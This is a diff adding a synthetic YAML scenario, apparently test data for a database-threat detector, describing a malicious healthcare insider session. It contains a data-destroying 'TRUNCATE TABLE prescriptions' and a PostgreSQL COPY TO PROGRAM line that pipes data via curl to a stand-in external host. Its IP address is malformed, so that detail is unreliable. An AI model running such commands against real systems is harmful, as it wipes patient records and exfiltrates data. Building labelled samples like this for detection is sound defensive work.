@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_78_data_tamper_mal_2263
+family_id: gen_healthcare_78_data_tamper_mal_fam2263
+domain: healthcare
+time_of_day: 04:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: nurse
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE prescriptions
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 91.219.236.16.97
+      port: 9001
